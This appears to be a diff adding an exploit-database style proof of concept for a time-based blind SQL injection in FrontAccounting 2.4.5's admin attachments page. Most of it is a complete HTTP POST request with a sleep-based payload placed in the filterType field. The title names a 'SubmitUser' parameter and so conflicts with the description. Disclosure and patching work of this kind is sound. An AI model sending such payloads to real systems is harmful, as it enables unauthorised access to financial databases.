@@ -1,0 +1,37 @@
+# Exploit Title: FrontAccounting 2.4.5 - 'SubmitUser' SQL Injection
+# Google Dork: N/A
+# Date: 2018-12-22
+# Exploit Author: Sainadh Jamalpur
+# Vendor Homepage: http://frontaccounting.com/
+# Software Link: https://sourceforge.net/projects/frontaccounting/
+# Version: 2.4.5
+# Tested on: XAMPP version 3.2.2 in Windows 10 64bit, Kali linux X64
+# CVE : N/A
+
+# ========================= Vendor Summery =====================
+#
+# FrontAccounting (FA) is a professional web-based Accounting system for
+# the entire ERP chain written in PHP, using MySQL. FA is multilingual and
+# multicurrency.
+#
+# ======================== Vulnerability Description ===============
+#
+# the parameter "filterType" in /attachments.php is Vulnerable to Time
+# Based Blind SQL Injection.
+# 
+# ======================== PoC =======================================
+
+POST /frontaccounting/admin/attachments.php? HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0)
+Gecko/20100101 Firefox/64.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Referer: http://localhost/frontaccounting/admin/attachments.php?
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 367
+DNT: 1
+Connection: close
+Cookie:
+Upgrade-Insecure-Requests: 1
+user_name_entry_field=admin&password=1234&company_login_name=0&ui_mode=1&SubmitUser=%A0%A0Login+--%3E%A0%A0&_random=831749.090143524&_token=1RJ9WhkRWKszXu-uPm6DTQxx&_confirmed=&_modified=0&_focus=filterType&ADD_ITEM=Add+new&description=&trans_no=&filterType=(select*from(select(sleep(20)))a)&_focus=filterType&_modified=0&_confirmed=&_token=Om-2mt32ZC3UkLAuzPwoFgxx
